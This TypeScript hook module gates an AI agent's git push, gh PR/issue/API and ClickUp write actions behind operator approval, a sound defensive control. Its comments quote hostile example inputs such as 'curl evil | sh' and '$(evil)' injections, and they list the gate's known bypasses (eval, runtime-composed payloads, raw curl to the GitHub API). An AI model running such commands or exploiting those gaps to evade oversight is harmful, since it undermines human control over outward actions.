// hooks/ts/bodies/dev-guard.ts
// Canonical body — verbatim port of hooks/dev-guard.sh decision logic, extended
// with a branch-aware push recognizer and a gh-pr-create autogate opt-in.
// Runtime-pure: imports no runtime symbol; reads only NormalizedInput (+ the
// injected DevGuardReader); returns only NormalizedDecision. Never branches on
// `input.runtime`.
//
// Sibling order-floor: gate-guard.ts (hooks/ts/bodies/gate-guard.ts) is a
// SEPARATE PreToolUse Bash hook that adds the deterministic outward-action
// ORDER check described in agents/_shared/gate-contract.md § "Outward-action
// release floor" — it denies a git push/gh pr create from a detected
// pipeline lane unless that lane's gate3_release is `ship`. This body stays
// destination-only (no 00-state.md read) and unaware of that floor; the two
// hooks are independently additive (deny > allow at the platform precedence
// level), not a replacement of one by the other.
//
// Detection mechanism (parse-based, command-lexer.ts): every covered-action
// check below consumes `analyzeCommand`'s resolved argv + per-token taint —
// never the raw command string. A wrapper-embedded or per-subcommand-binary
// covered action (`bash -c "git push origin main"`,
// `$(git --exec-path)/git-push origin main`) resolves to the same executed
// argv as its bare form. A statically-unresolvable wrapper payload or an
// exceeded recursion depth is NOT gated — evaluation proceeds over the
// segments the analyzer did resolve (`ls | sort`, `bash -c "echo $HOME"`,
// `eval "$CMD"` produce no decision); this gate covers outward git/gh/
// ClickUp actions expressed in the command, not arbitrary command execution
// (documented residual, docs/dev-mode.md § "Threat model").
// `allow` is reserved for a single, un-chained, untainted `git push`
// invocation recognized by the shared closed positive grammar
// (`matchBenignPushGrammar`) — a grammar match is necessary but not
// sufficient: the static `{main, master}` ask-floor and the positive
// non-default-branch resolution via `origin/HEAD` (`evaluateDestinationBranch`)
// still apply to the resolved destination AFTER the grammar match. A
// case-variant or `.exe`-suffixed invocation (`GIT PUSH`, `GH pr create`,
// `git.exe push`) is still detected as covered — basename/subcommand
// resolution is centralized in `classifyCoveredAction` (case-insensitive,
// `.exe`-stripped) — but can never reach `allow`, gated by
// `ClassifiedCommand.binaryCaseExact`. A command-runner prefix (`env`,
// `timeout`, `nice`, `nohup`, `command`, `stdbuf`, `setsid`, `time`, `sudo`,
// `doas`) is resolved past to the real command by the same shared
// classifier and always fails closed to `ask` (`requiresFailClosed`).
//
// Coverage catalogue (mirrors dev-guard.sh header, closed and enumerated):
//   1. Push to a remote: git push (bare, -C, env-prefixed, wrapper-embedded,
//      per-subcommand-binary)
//   2. PR/issue writes via gh (gh pr create/merge/review/comment,
//      gh issue create/edit/comment, gh api REST PUT/POST/PATCH/DELETE .../pulls,
//      gh api graphql PR-write mutations). Raw HTTP to api.github.com is NOT
//      covered — prohibited by the prompt-level "git and gh only" rule instead.
//   3. ClickUp MCP outward writes (tool.name matches write pattern, no command)
//
// Default: none (no-decision) — ask/deny/allow EXCLUSIVELY for covered actions.
//
// Fail-closed for covered actions: empty-cmd + raw-payload outward token → ask;
// any environment-assignment prefix, `git -c <k=v>` config override, or
// tree/exec-path redirect on a covered push → ask (only `-p`/`--paginate`/
// `--no-pager` and an exact-resolved `-C {dir}` are allow-eligible).
// ClickUp branch: gates on tool.name alone (command field absent → null).
//
// git-push recognizer: a CLOSED POSITIVE GRAMMAR (`matchBenignPushGrammar`,
// command-lexer.ts). `allow` is emitted ONLY when the command is a single,
// bare, exact-case, untainted `git push [benign-flags] origin <plain-branch>`
// AND the resolved destination positively confirms non-default via
// `origin/HEAD`. ANY deviation — a compound/wrapper-embedded command, a
// disqualifying flag, a non-origin remote, a tag-like/qualified destination,
// a force flag or `+`-refspec, a delete refspec, a tainted token, or a
// case-variant invocation — falls to `ask` (never `none`, since the analyzer
// already identified this as a covered push).
//
// gh --repo/-R target-awareness: gh's `--repo`/`-R` persistent flag may sit
// ANYWHERE in the resolved argv before the subcommand+verb pair; every
// mutating-gh check below resolves it (and strips it) before reading the
// subcommand/verb, closing the coverage gap where a leading `--repo`
// defeated a literal-string router entirely. The resolved target repo, when
// present, is surfaced in the `ask` reason for operator transparency; the
// underlying decision is unchanged by which repo is targeted.

import type { NormalizedInput, NormalizedDecision } from "../shim/normalized-v1.js";
import {
  analyzeCommand,
  classifyCoveredAction,
  matchBenignPushGrammar,
  isBenignPushFlag,
  isPlainBranchDestination,
} from "./command-lexer.js";
import type { ArgvToken, EffectiveCommand, ClassifiedCommand, PushGrammarReader } from "./command-lexer.js";

// ---------------------------------------------------------------------------
// DevGuardReader — injected by the entry module (mirrors PrepublishReader).
// Exec is bounded to the bare-push and HEAD/@ resolution paths; every method
// fails open to null so the body can fail-closed to `ask` (composition:
// reader fails open, gate fails closed — see prepublish-guard.ts).
// ---------------------------------------------------------------------------

export interface DevGuardReader {
  /** git rev-parse --abbrev-ref HEAD; null on any error. When `dir` is given
   *  (the `git -C {dir} push` closed form), resolves the current branch OF
   *  THAT DIRECTORY, not the payload cwd; absent `dir` resolves against the
   *  payload cwd exactly as before (backward-compat). */
  gitCurrentBranch(dir?: string): string | null;
  /** Resolve the repo's default branch name via git (e.g. origin/HEAD symref);
   *  null on any error. A null here means the default cannot be POSITIVELY
   *  resolved — the recognizer never falls back to permissively allowing a
   *  name simply because it isn't literally main/master (see
   *  evaluateDestinationBranch). When `dir` is given, resolves the default
   *  branch OF THAT DIRECTORY; absent `dir` resolves against the payload cwd
   *  (backward-compat). */
  resolveDefaultBranch(dir?: string): string | null;
  /** Resolve the EFFECTIVE push destination for the current branch as a
   *  `<remote>/<ref>` symbolic name (git's own `@{push}` resolution — honors
   *  `branch.<n>.pushRemote` → `remote.pushDefault` → `branch.<n>.remote`,
   *  in that precedence); null on any error (no upstream/push target
   *  configured, or ambiguous). Resolution is by NAME, not by URL — the
   *  integrity of what "origin" points to is a model assumption; remote-
   *  mutating commands (git remote set-url|add|rename|set-head) are not in
   *  this gate's covered set and remain prompted through the normal
   *  permission flow. A stale or spoofed `origin/HEAD` can also mislead the
   *  default-branch resolution — see docs/permission-provisioning.md
   *  § Documented residuals for the accepted residual and its scope
   *  (non-standard-default repos only; the `{main, master}` floor is
   *  unconditional and unaffected). */
  resolveEffectivePushRemoteRef(dir?: string): string | null;
  /** Read ~/.claude/.team-harness.json; null on any error. */
  readConfig(): Record<string, unknown> | null;
}

// ---------------------------------------------------------------------------
// Decision helpers — mirror dev-guard.sh ask()/nodecision() semantics
// ---------------------------------------------------------------------------

function ask(reason: string): NormalizedDecision {
  return { decision: "ask", reason, mutations: null };
}

function allow(reason: string): NormalizedDecision {
  return { decision: "allow", reason, mutations: null };
}

function none(): NormalizedDecision {
  return { decision: "none", reason: "", mutations: null };
}

const GATE_DOC_POINTER = "see docs/dev-mode.md § Outward-Action Gate";

// ---------------------------------------------------------------------------
// ClickUp MCP write-pattern (mirrors _clickup_write_pattern in dev-guard.sh)
// ---------------------------------------------------------------------------
const CLICKUP_WRITE_RE =
  /^mcp__.+__clickup_(update_task|create_task|create_task_comment|attach_task_file|delete_task)$/;

// Defence-in-depth (F-016): raw payload scan when cmd is empty (mirrors dev-guard.sh lines 185-189)
const RAW_OUTWARD_SCAN_RE =
  /(git\s+push|gh\s+pr\s+(create|merge|review|comment)|gh\s+issue\s+(create|edit|comment)|gh\s+api.*pulls)/i;

// Read-only reviewThreads listing queries carry no mutation name → nodecision.
const GRAPHQL_PR_MUTATIONS_RE =
  /(resolveReviewThread|unresolveReviewThread|addPullRequestReviewThreadReply|addPullRequestReviewComment|addPullRequestReview|submitPullRequestReview|mergePullRequest)/;

// Step 6 — the ask-FLOOR: checked case-insensitively, and NEVER a permissive
// fallback. An unresolvable dynamic default is unconditionally `ask` (see
// evaluateDestinationBranch) — this floor only ever narrows toward `ask`.
const DEFAULT_BRANCH_FLOOR = new Set(["main", "master"]);

// ---------------------------------------------------------------------------
// Destination-branch resolution — fail-closed. The static floor is checked
// first (case-insensitive, never bypassable); an `allow` requires the reader
// to POSITIVELY resolve the real default AND the destination to differ from
// it (also case-insensitive). An unresolvable default is never treated as
// license to allow a name simply because it isn't literally main/master.
// ---------------------------------------------------------------------------

function evaluateDestinationBranch(
  dst: string,
  reader: DevGuardReader,
  allowContext: string,
  dir?: string
): NormalizedDecision {
  const targetNote = dir !== undefined ? ` (target '-C ${dir}')` : "";

  if (DEFAULT_BRANCH_FLOOR.has(dst.toLowerCase())) {
    return ask(
      `outward action 'git push' to '${dst}'${targetNote} — the static {main, master} floor always requires explicit operator approval, never allow (dev-guard.ts); ${GATE_DOC_POINTER}`
    );
  }

  const resolvedDefault = dir !== undefined ? reader.resolveDefaultBranch(dir) : reader.resolveDefaultBranch();
  if (!resolvedDefault) {
    return ask(
      `outward action 'git push' to '${dst}'${targetNote} — the target repository's real default branch could not be positively resolved (requires origin/HEAD); fail-closed rather than assume '${dst}' is non-default (dev-guard.ts); ${GATE_DOC_POINTER}`
    );
  }

  if (dst.toLowerCase() === resolvedDefault.toLowerCase()) {
    return ask(
      `outward action 'git push' to the default branch '${dst}'${targetNote} requires explicit operator approval (dev-guard.ts); ${GATE_DOC_POINTER}`
    );
  }

  return allow(
    `${allowContext} — destination '${dst}'${targetNote} positively confirmed non-default via origin/HEAD (dev-guard.ts); ${GATE_DOC_POINTER}`
  );
}

// Bare `git push` (no refspec): resolve `@{push}` and require BOTH the
// effective remote to be `origin` AND the effective destination BRANCH (not
// the current branch) to be positively non-default — closes a triangular
// `branch.<n>.merge` config, where `@{push}` can resolve to a different
// branch than HEAD.
function evaluateBarePushAt(dir: string, reader: DevGuardReader): NormalizedDecision {
  const pushRef = reader.resolveEffectivePushRemoteRef(dir);
  if (pushRef === null) {
    return ask(
      `outward action 'git -C ${dir} push' (no refspec) — the effective push destination could not be resolved for the target directory (no configured upstream/push target); fail-closed (dev-guard.ts); ${GATE_DOC_POINTER}`
    );
  }

  const slashIdx = pushRef.indexOf("/");
  const remote = slashIdx >= 0 ? pushRef.slice(0, slashIdx) : pushRef;
  const destBranch = slashIdx >= 0 ? pushRef.slice(slashIdx + 1) : "";

  if (remote !== "origin") {
    return ask(
      `outward action 'git -C ${dir} push' (no refspec) — the effective push-remote for the target directory resolves to '${remote}', not 'origin' by name (branch.<n>.pushRemote/remote.pushDefault honored); fail-closed (dev-guard.ts); ${GATE_DOC_POINTER}`
    );
  }
  if (!destBranch || !isPlainBranchDestination(destBranch)) {
    return ask(
      `outward action 'git -C ${dir} push' (no refspec) — the effective push destination branch could not be extracted from '${pushRef}' as a plain branch name; fail-closed (dev-guard.ts); ${GATE_DOC_POINTER}`
    );
  }

  return evaluateDestinationBranch(
    destBranch,
    reader,
    `bare 'git -C ${dir} push' resolved to non-default branch '${destBranch}' with effective remote 'origin' (target directory)`,
    dir
  );
}

function evaluateBarePush(reader: DevGuardReader, dir?: string): NormalizedDecision {
  if (dir !== undefined) return evaluateBarePushAt(dir, reader);

  const pushRef = reader.resolveEffectivePushRemoteRef();
  if (pushRef === null) {
    return ask(
      `outward action 'git push' (no refspec) — the effective push destination could not be resolved (no configured upstream/push target); fail-closed (dev-guard.ts); ${GATE_DOC_POINTER}`
    );
  }

  const slashIdx = pushRef.indexOf("/");
  const remote = slashIdx >= 0 ? pushRef.slice(0, slashIdx) : pushRef;
  const destBranch = slashIdx >= 0 ? pushRef.slice(slashIdx + 1) : "";

  if (remote !== "origin") {
    return ask(
      `outward action 'git push' (no refspec) — the effective push-remote resolves to '${remote}', not 'origin' by name (branch.<n>.pushRemote/remote.pushDefault honored); fail-closed (dev-guard.ts); ${GATE_DOC_POINTER}`
    );
  }
  if (!destBranch || !isPlainBranchDestination(destBranch)) {
    return ask(
      `outward action 'git push' (no refspec) — the effective push destination branch could not be extracted from '${pushRef}' as a plain branch name; fail-closed (dev-guard.ts); ${GATE_DOC_POINTER}`
    );
  }

  return evaluateDestinationBranch(
    destBranch,
    reader,
    `bare 'git push' resolved to non-default branch '${destBranch}' with effective remote 'origin'`
  );
}

// ---------------------------------------------------------------------------
// git push — argv-based closed positive grammar (command-lexer.ts's
// matchBenignPushGrammar) plus the bare-push/remote-name dispatch that the
// grammar itself deliberately does not attempt (it requires exactly two
// positionals, `origin <refspec>`).
// ---------------------------------------------------------------------------

function pushGrammarReader(reader: DevGuardReader, dir?: string): PushGrammarReader {
  return {
    gitCurrentBranch: () => (dir !== undefined ? reader.gitCurrentBranch(dir) : reader.gitCurrentBranch()),
  };
}

function evaluateGitPushArgs(args: ArgvToken[], reader: DevGuardReader, dir?: string): NormalizedDecision {
  const targetLabel = dir !== undefined ? `'git -C ${dir} push'` : "'git push'";
  const values = args.map((t) => t.value);
  const tainted = args.map((t) => t.tainted);

  const grammar = matchBenignPushGrammar(values, tainted, pushGrammarReader(reader, dir));
  if (grammar.matched && grammar.destination !== null) {
    return evaluateDestinationBranch(
      grammar.destination,
      reader,
      `${targetLabel} recognized as the closed benign-push form`,
      dir
    );
  }

  const flagTokens = values.filter((v) => v.startsWith("-"));
  const positional = values.filter((v) => !v.startsWith("-"));
  const disqualifyingFlags = flagTokens.filter((v) => !isBenignPushFlag(v));
  if (disqualifyingFlags.length > 0) {
    return ask(
      `outward action ${targetLabel} with disqualifying flag(s) (${disqualifyingFlags.join(", ")}) requires explicit operator approval — only -u/--set-upstream/-v/--verbose/--progress are on the benign allowlist (dev-guard.ts); ${GATE_DOC_POINTER}`
    );
  }

  if (positional.length === 0) return evaluateBarePush(reader, dir);
  if (positional[0] !== "origin") {
    return ask(
      `outward action ${targetLabel} to a remote other than 'origin' (resolved by NAME) requires explicit operator approval (dev-guard.ts); ${GATE_DOC_POINTER}`
    );
  }
  if (positional.length === 1) return evaluateBarePush(reader, dir);

  return ask(
    `outward action ${targetLabel} does not match the closed benign-push grammar (multi-refspec, tainted token, tag-like/qualified destination, or delete refspec) — requires explicit operator approval (dev-guard.ts); ${GATE_DOC_POINTER}`
  );
}

// A tainted or dynamic git subcommand token could resolve to "push" at
// runtime (`git $V origin main`) or carry a glued shell metacharacter fused
// directly onto the literal verb (`push>/dev/null`, `push$(evil)`) — both
// must fail closed to `ask` rather than silently miss the coverage. A
// genuinely different verb sharing only the "push" PREFIX at a real word
// boundary (`pushx`) must NOT be treated as a candidate.
const DYNAMIC_TOKEN_PREFIX_RE = /^[$`{]/;

function isPushCandidateSubcommand(sub: string): boolean {
  const lower = sub.toLowerCase();
  if (lower === "push") return true;
  if (DYNAMIC_TOKEN_PREFIX_RE.test(sub)) return true;
  if (!lower.startsWith("push")) return false;
  const boundaryChar = sub.charAt(4);
  return boundaryChar !== "" && !/[A-Za-z0-9_]/.test(boundaryChar);
}

// command-lexer.ts's classifyCoveredAction already resolves the git
// subcommand case-insensitively and `.exe`-stripped (centralized — no
// per-hook fallback needed here); `binaryCaseExact` tells this caller
// whether the ORIGINAL binary/subcommand token was already the exact,
// literal, lowercase spelling the grammar requires — a case-variant or
// `.exe` invocation (GIT, Git, git.exe) is still detected as a push
// CANDIDATE (routes to `ask`) but can never reach `allow`.
function isGitPushCandidate(classified: ClassifiedCommand): boolean {
  return classified.gitSubcommand !== null && isPushCandidateSubcommand(classified.gitSubcommand);
}

function evaluateGitClassified(classified: ClassifiedCommand, reader: DevGuardReader): NormalizedDecision {
  if (classified.gitSubcommand === null || !isPushCandidateSubcommand(classified.gitSubcommand)) return none();

  if (!classified.binaryCaseExact || classified.gitSubcommand !== "push") {
    return ask(
      `outward action 'git push' — the binary/subcommand token does not exactly and literally match 'git'/'push' (case-sensitive, no '.exe'), or could not be statically resolved to it; fail-closed rather than assume it is not a covered push (dev-guard.ts); ${GATE_DOC_POINTER}`
    );
  }

  if (classified.requiresFailClosed) {
    return ask(
      `outward action 'git push' combined with an environment-assignment prefix, a command-runner prefix (env/timeout/nice/nohup/command/stdbuf/setsid/time/sudo/doas), a '-c' config override, a tree/exec-path redirect, or an unresolved/unknown option requires explicit operator approval — fail-closed (dev-guard.ts); ${GATE_DOC_POINTER}`
    );
  }

  return evaluateGitPushArgs(classified.args, reader, classified.cDir ?? undefined);
}

// ---------------------------------------------------------------------------
// gh — mutating-verb detection on resolved argv. gh's `--repo`/`-R`
// persistent flag may sit anywhere before the subcommand+verb; it is
// resolved and stripped before the verb is read.
// ---------------------------------------------------------------------------

const REPO_FLAG_NAMES = new Set(["--repo", "-R"]);
const GH_MUTATING_PR_VERBS = new Set(["create", "merge", "review", "comment"]);
const GH_MUTATING_ISSUE_VERBS = new Set(["create", "edit", "comment"]);

interface GhVerbScan {
  subcommand: string | null;
  verb: string | null;
  repoTarget: string | null;
  cleanArgs: ArgvToken[];
}

function resolveGhVerb(args: ArgvToken[]): GhVerbScan {
  const cleanArgs: ArgvToken[] = [];
  let repoTarget: string | null = null;

  for (let i = 0; i < args.length; i++) {
    const tok = args[i];
    const eqIdx = tok.value.indexOf("=");
    const name = eqIdx >= 0 ? tok.value.slice(0, eqIdx) : tok.value;
    if (REPO_FLAG_NAMES.has(name)) {
      repoTarget = eqIdx >= 0 ? tok.value.slice(eqIdx + 1) : args[i + 1]?.value ?? null;
      if (eqIdx < 0) i++;
      continue;
    }
    cleanArgs.push(tok);
  }

  return {
    subcommand: cleanArgs[0]?.value.toLowerCase() ?? null,
    verb: cleanArgs[1]?.value.toLowerCase() ?? null,
    repoTarget,
    cleanArgs,
  };
}

// A verb token that merely STARTS WITH a known mutating verb at a real word
// boundary (a glued shell metacharacter fused onto the verb, e.g.
// `merge>/dev/null`, `create$(evil)`) is still treated as that verb — same
// rationale as isPushCandidateSubcommand above.
function matchesVerbPrefix(verbLower: string, knownVerbs: Set<string>): string | null {
  if (knownVerbs.has(verbLower)) return verbLower;
  for (const verb of knownVerbs) {
    if (!verbLower.startsWith(verb)) continue;
    const boundaryChar = verbLower.charAt(verb.length);
    if (boundaryChar !== "" && !/[A-Za-z0-9_]/.test(boundaryChar)) return verb;
  }
  return null;
}

type GhActionKind = "pr-create" | "pr-mutating" | "issue-mutating" | "api-graphql-pr" | "api-rest-pr";

interface GhAction {
  kind: GhActionKind;
  verb: string | null;
  repoTarget: string | null;
  cleanArgs: ArgvToken[];
}

function isGraphqlPrMutation(cleanArgs: ArgvToken[]): boolean {
  return cleanArgs.some((t) => GRAPHQL_PR_MUTATIONS_RE.test(t.value));
}

function isRestMutatingPrEndpoint(cleanArgs: ArgvToken[]): boolean {
  const hasMutatingMethod = cleanArgs.some((t, i) => {
    if (t.value === "-X" || t.value === "--method") {
      const next = cleanArgs[i + 1];
      return !!next && /^(PUT|POST|PATCH|DELETE)$/i.test(next.value);
    }
    return /^(--method=|-X)(PUT|POST|PATCH|DELETE)$/i.test(t.value);
  });
  return hasMutatingMethod && cleanArgs.some((t) => /pulls/i.test(t.value));
}

function classifyGhAction(args: ArgvToken[]): GhAction | null {
  const { subcommand, verb, repoTarget, cleanArgs } = resolveGhVerb(args);

  if (subcommand === "pr") {
    const matched = verb !== null ? matchesVerbPrefix(verb, GH_MUTATING_PR_VERBS) : null;
    if (matched === "create") return { kind: "pr-create", verb: matched, repoTarget, cleanArgs };
    if (matched !== null) return { kind: "pr-mutating", verb: matched, repoTarget, cleanArgs };
    return null;
  }
  if (subcommand === "issue") {
    const matched = verb !== null ? matchesVerbPrefix(verb, GH_MUTATING_ISSUE_VERBS) : null;
    return matched !== null ? { kind: "issue-mutating", verb: matched, repoTarget, cleanArgs } : null;
  }
  if (subcommand === "api") {
    const verbToken = cleanArgs[1]?.value.toLowerCase() ?? null;
    if (verbToken === "graphql") {
      return isGraphqlPrMutation(cleanArgs) ? { kind: "api-graphql-pr", verb: null, repoTarget, cleanArgs } : null;
    }
    return isRestMutatingPrEndpoint(cleanArgs) ? { kind: "api-rest-pr", verb: null, repoTarget, cleanArgs } : null;
  }
  return null;
}

// The autogate `allow` requires an exact, case-sensitive, single, untainted
// `gh pr create` — a case-variant binary, a glued/tainted verb token, or any
// fail-closed prefix/option falls through to the plain ask branch.
function isCleanGhPrCreate(classified: ClassifiedCommand, action: GhAction): boolean {
  return (
    classified.binary === "gh" &&
    classified.binaryCaseExact &&
    !classified.requiresFailClosed &&
    action.cleanArgs[0]?.value === "pr" &&
    action.cleanArgs[1]?.value === "create" &&
    classified.args.every((t) => !t.tainted)
  );
}

function isPrCreateAutogateEnabled(reader: DevGuardReader): boolean {
  const config = reader.readConfig();
  if (!config) return false;
  const autogate = config["autogate"];
  if (!autogate || typeof autogate !== "object") return false;
  return (autogate as Record<string, unknown>)["pr_create"] === true;
}

function evaluateGhClassified(classified: ClassifiedCommand, reader: DevGuardReader): NormalizedDecision | null {
  const action = classifyGhAction(classified.args);
  if (!action) return null;
  const ghTargetNote = action.repoTarget ? ` (target repo: '${action.repoTarget}')` : "";

  if (action.kind === "pr-create") {
    if (isCleanGhPrCreate(classified, action) && isPrCreateAutogateEnabled(reader)) {
      return allow(
        `outward action 'gh pr create'${ghTargetNote} auto-allowed by opt-in config autogate.pr_create=true (dev-guard.ts); the prepublish-guard tests-before-PR floor still applies independently (deny > allow); ${GATE_DOC_POINTER}`
      );
    }
    return ask(
      `outward action 'gh pr create'${ghTargetNote} requires explicit operator approval (dev-guard.ts); ${GATE_DOC_POINTER}`
    );
  }
  if (action.kind === "pr-mutating") {
    return ask(
      `outward action 'gh pr ${action.verb}'${ghTargetNote} requires explicit operator approval (dev-guard.ts); ${GATE_DOC_POINTER}`
    );
  }
  if (action.kind === "issue-mutating") {
    return ask(
      `outward action 'gh issue write'${ghTargetNote} requires explicit operator approval (dev-guard.ts); ${GATE_DOC_POINTER}`
    );
  }
  if (action.kind === "api-graphql-pr") {
    return ask(`outward action 'gh api graphql' PR-mutating operation requires explicit operator approval (dev-guard.ts); ${GATE_DOC_POINTER}`);
  }
  return ask(`outward action 'gh api' mutating PR endpoint requires explicit operator approval (dev-guard.ts); ${GATE_DOC_POINTER}`);
}

// ---------------------------------------------------------------------------
// Per-effective-command classification, shared by the single-command
// (potentially `allow`-eligible) path and the compound/wrapper-embedded
// coverage scan (`ask`-only — see evaluate()).
//
// Raw HTTP writes to api.github.com (curl/wget with a mutating method) are
// deliberately NOT a covered action: the operator-level rule is that agents
// never call the GitHub API directly — git and gh are the only sanctioned
// GitHub channels (the documented gh-fallback path excepted) — so the gate
// covers those two binaries and leaves the prohibited channel to the
// prompt-level rule plus the platform permission flow.
// ---------------------------------------------------------------------------

function isCoveredEffectiveCommand(cmd: EffectiveCommand): boolean {
  const classified = classifyCoveredAction(cmd);
  if (!classified) return false;

  const binaryLower = classified.binary.toLowerCase();
  if (binaryLower === "git") return isGitPushCandidate(classified);
  if (binaryLower === "gh") return classifyGhAction(classified.args) !== null;
  return false;
}

function evaluateSingleCommand(cmd: EffectiveCommand, reader: DevGuardReader): NormalizedDecision {
  const classified = classifyCoveredAction(cmd);
  if (!classified) return none();

  const binaryLower = classified.binary.toLowerCase();
  if (binaryLower === "git") return evaluateGitClassified(classified, reader);

  if (binaryLower === "gh") {
    const decision = evaluateGhClassified(classified, reader);
    if (decision) return decision;
  }

  return none();
}

// ---------------------------------------------------------------------------
// Public evaluate() — the single entry point every runtime calls.
// ---------------------------------------------------------------------------

export function evaluate(input: NormalizedInput, reader: DevGuardReader): NormalizedDecision {
  // Step 1a — ClickUp MCP outward-write (tool.name match, no command field).
  // This branch runs BEFORE any command extraction so an absent command field
  // does not degrade to none (parity with dev-guard.sh:97-128).
  const toolName = input.tool?.name ?? "";
  if (toolName && CLICKUP_WRITE_RE.test(toolName)) {
    return ask(
      `outward action — ClickUp MCP outward write (${toolName}) requires explicit operator approval; preview the change before confirming (dev-guard.ts; see docs/dev-mode.md)`
    );
  }

  // Extract command from tool.input.command (absent → null, never undefined).
  const cmd = input.tool?.input?.["command"];
  const cmdStr = typeof cmd === "string" ? cmd : null;

  // Defence-in-depth (F-016): if cmd is null/empty on a Bash payload, scan raw
  // payload representation for covered destination patterns → ask (fail-safe direction).
  if (cmdStr === null && toolName === "Bash") {
    const rawRepr = JSON.stringify(input.tool?.input ?? {});
    if (RAW_OUTWARD_SCAN_RE.test(rawRepr)) {
      return ask(
        "outward action detected in raw payload (escape-aware extraction fallback); requires explicit operator approval (dev-guard.ts)"
      );
    }
    return none();
  }
  if (cmdStr === null) return none();

  // An unresolvable wrapper payload (`analyzed.unresolvableShellPayload`) or
  // exceeded unwrap depth (`analyzed.depthExceeded`) is NOT gated: evaluation
  // proceeds over the effective commands the analyzer DID resolve, so a
  // covered action in any resolvable segment or statically-resolvable wrapper
  // payload (`bash -c "git push origin main"`, `gh --repo o/r pr create &&
  // curl evil | sh`) is still caught by the parse-based scan below, while a
  // runtime-composed payload (`eval "$CMD"`, `curl … | bash`) passes with no
  // decision — a documented residual under the honest-developer threat model
  // (docs/dev-mode.md § "Threat model"): this gate covers outward git/gh/
  // ClickUp actions expressed in the command, not arbitrary command
  // execution; gating every unresolvable shell composition proved to be a
  // constant false-positive tax on ordinary development.
  const analyzed = analyzeCommand(cmdStr);

  // `allow` is reserved for a single, un-chained, un-wrapped invocation — a
  // compound command or a wrapper-embedded covered action always has more
  // than one effective command in the resolved list (the wrapper's own
  // invocation plus its resolved payload, or multiple chained segments).
  if (analyzed.commands.length === 1) {
    return evaluateSingleCommand(analyzed.commands[0], reader);
  }

  for (const command of analyzed.commands) {
    if (isCoveredEffectiveCommand(command)) {
      return ask(
        `outward action detected inside a compound or wrapper-embedded command; allow is reserved for a single, bare, un-chained invocation — requires explicit operator approval (dev-guard.ts); ${GATE_DOC_POINTER}`
      );
    }
  }

  return none();
}
